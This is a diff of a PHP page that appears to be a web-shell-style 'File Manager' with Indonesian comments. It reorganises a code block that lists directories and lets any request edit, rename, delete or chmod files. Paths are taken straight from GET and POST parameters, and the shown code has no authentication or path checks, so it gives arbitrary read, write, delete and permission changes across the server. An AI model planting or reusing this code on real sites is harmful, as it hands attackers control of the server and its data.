@@ -152,24 +152,6 @@
             white-space: pre-wrap;
             word-wrap: break-word;
         }
-        input[type="text"] {
-    padding: 10px;
-    border-radius: 5px;
-    border: 1px solid #ccc;
-    width: calc(100% - 22px);
-    margin-bottom: 10px;
-}
-
-input[type="submit"] {
-    padding: 10px 15px;
-    border: none;
-    border-radius: 5px;
-    cursor: pointer;
-}
-
-input[type="submit"]:hover {
-    opacity: 0.8;
-}
     </style>
 </head>
 <body>
@@ -278,62 +260,84 @@ input[type="submit"]:hover {
             }
         }
 
- <?php
-// Cek jika ada file yang dipilih
-if (isset($_GET['file'])) {
-    $filePath = $targetDir . '/' . $_GET['file'];
-    if (file_exists($filePath) && is_readable($filePath)) {
-        // Handle file content update
-        if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['content'])) {
-            file_put_contents($filePath, $_POST['content']);
-            echo '<div class="notification success">File updated successfully.</div>';
+        // Menampilkan konten file jika parameter file ada
+        if (isset($_GET['file'])) {
+            $filePath = $targetDir . '/' . $_GET['file'];
+            if (file_exists($filePath) && is_readable($filePath)) {
+                if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['content'])) {
+                    file_put_contents($filePath, $_POST['content']);
+                    echo '<div class="notification success">File updated successfully.</div>';
+                }
+                echo '<h3>Edit File: ' . htmlspecialchars($_GET['file']) . '</h3>';
+                echo '<form method="POST"><textarea name="content" rows="10" cols="50">' . htmlspecialchars(file_get_contents($filePath)) . '</textarea><br>';
+                echo '<input type="submit" value="Save Changes"></form>';
+
+                // Rename
+                echo '<form method="POST" action="">';
+                echo '<input type="text" name="new_name" placeholder="New file name" required>';
+                echo '<input type="hidden" name="old_name" value="' . htmlspecialchars($_GET['file']) . '">';
+                echo '<input type="submit" value="Rename">';
+                echo '</form>';
+
+                if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['new_name']) && isset($_POST['old_name'])) {
+                    $oldPath = $targetDir . '/' . $_POST['old_name'];
+                    $newPath = $targetDir . '/' . $_POST['new_name'];
+                    if (rename($oldPath, $newPath)) {
+                        echo '<div class="notification success">File renamed successfully.</div>';
+                    } else {
+                        echo '<div class="notification error">Failed to rename file.</div>';
+                    }
+                }
+
+                // Change Permissions
+                echo '<form method="POST" action="">';
+                echo '<input type="text" name="permissions" placeholder="New permissions (e.g., 755)" required>';
+                echo '<input type="hidden" name="file_path" value="' . htmlspecialchars($filePath) . '">';
+                echo '<input type="submit" value="Change Permissions">';
+                echo '</form>';
+
+                if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['permissions']) && isset($_POST['file_path'])) {
+                    $filePath = $_POST['file_path'];
+                    if (chmod($filePath, octdec($_POST['permissions']))) {
+                        echo '<div class="notification success">Permissions changed successfully.</div>';
+                    } else {
+                        echo '<div class="notification error">Failed to change permissions.</div>';
+                    }
+                }
+
+                // Delete File
+                echo '<form method="POST" action="">';
+                echo '<input type="hidden" name="delete_file" value="' . htmlspecialchars($_GET['file']) . '">';
+                echo '<input type="submit" value="Delete" onclick="return confirm(\'Are you sure you want to delete this file?\');">';
+                echo '</form>';
+
+                if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['delete_file'])) {
+                    $fileToDelete = $targetDir . '/' . $_POST['delete_file'];
+                    if (unlink($fileToDelete)) {
+                        echo '<div class="notification success">File deleted successfully.</div>';
+                    } else {
+                        echo '<div class="notification error">Failed to delete file.</div>';
+                    }
+                }
+            } else {
+                echo '<p class="error">File tidak dapat dibaca.</p>';
+            }
+        } else {
+            // Menampilkan folder
+            echo '<h2>File Manager</h2>';
+            echo '<table>';
+            echo '<thead><tr><th>Folder/File</th></tr></thead><tbody>';
+            foreach ($folders as $folder) {
+                echo '<tr><td class="folder"><a href="?dir=' . urlencode($targetDir . '/' . $folder) . '" class="folder-link"><i class="fas fa-folder icon-folder"></i>' . htmlspecialchars($folder) . '</a></td></tr>';
+            }
+
+            // Menampilkan file
+            foreach ($filesList as $file) {
+                echo '<tr><td class="file"><a href="?dir=' . urlencode($targetDir) . '&file=' . urlencode($file) . '" class="file-link"><i class="fas fa-file icon-file"></i>' . htmlspecialchars($file) . '</a></td></tr>';
+            }
+            echo '</tbody></table>';
         }
-
-        // Display edit form
-        echo '<h3>Edit File: ' . htmlspecialchars($_GET['file']) . '</h3>';
-        echo '<form method="POST"><textarea name="content" rows="10" cols="50" style="width: 100%;"></textarea><br>';
-        echo '<input type="submit" value="Save Changes" style="background-color: #28a745; color: white; padding: 10px; border: none; border-radius: 5px; cursor: pointer;"></form>';
-
-        // Rename
-        echo '<h4>Rename File</h4>';
-        echo '<form method="POST" action="" style="margin-bottom: 20px;">';
-        echo '<input type="text" name="new_name" placeholder="New file name" required style="width: calc(100% - 10px); padding: 5px; border-radius: 5px; border: 1px solid #ccc;">';
-        echo '<input type="hidden" name="old_name" value="' . htmlspecialchars($_GET['file']) . '">';
-        echo '<input type="submit" value="Rename" style="background-color: #007bff; color: white; padding: 10px; border: none; border-radius: 5px; cursor: pointer;">';
-        echo '</form>';
-
-        // Change Permissions
-        echo '<h4>Change Permissions</h4>';
-        echo '<form method="POST" action="" style="margin-bottom: 20px;">';
-        echo '<input type="text" name="permissions" placeholder="New permissions (e.g., 755)" required style="width: calc(100% - 10px); padding: 5px; border-radius: 5px; border: 1px solid #ccc;">';
-        echo '<input type="hidden" name="file_path" value="' . htmlspecialchars($filePath) . '">';
-        echo '<input type="submit" value="Change Permissions" style="background-color: #ffc107; color: white; padding: 10px; border: none; border-radius: 5px; cursor: pointer;">';
-        echo '</form>';
-
-        // Delete File
-        echo '<h4>Delete File</h4>';
-        echo '<form method="POST" action="">';
-        echo '<input type="hidden" name="delete_file" value="' . htmlspecialchars($_GET['file']) . '">';
-        echo '<input type="submit" value="Delete" style="background-color: #dc3545; color: white; padding: 10px; border: none; border-radius: 5px; cursor: pointer;" onclick="return confirm(\'Are you sure you want to delete this file?\');">';
-        echo '</form>';
-    } else {
-        echo '<p class="error">File tidak dapat dibaca.</p>';
-    }
-} else {
-    // Menampilkan folder dan file jika tidak ada file yang dipilih
-    echo '<h2>File Manager</h2>';
-    echo '<table>';
-    echo '<thead><tr><th>Folder/File</th></tr></thead><tbody>';
-    foreach ($folders as $folder) {
-        echo '<tr><td class="folder"><a href="?dir=' . urlencode($targetDir . '/' . $folder) . '" class="folder-link"><i class="fas fa-folder icon-folder"></i>' . htmlspecialchars($folder) . '</a></td></tr>';
-    }
-
-    foreach ($filesList as $file) {
-        echo '<tr><td class="file"><a href="?dir=' . urlencode($targetDir) . '&file=' . urlencode($file) . '" class="file-link"><i class="fas fa-file icon-file"></i>' . htmlspecialchars($file) . '</a></td></tr>';
-    }
-    echo '</tbody></table>';
-}
-?>
+        ?>
     </div>
 
     <script>
